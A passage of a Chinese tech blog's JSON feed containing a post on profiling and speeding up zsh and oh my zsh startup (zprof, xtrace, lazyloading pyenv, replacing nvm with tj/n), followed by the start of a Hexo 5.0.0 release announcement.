href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\">\n<div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-08-10</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 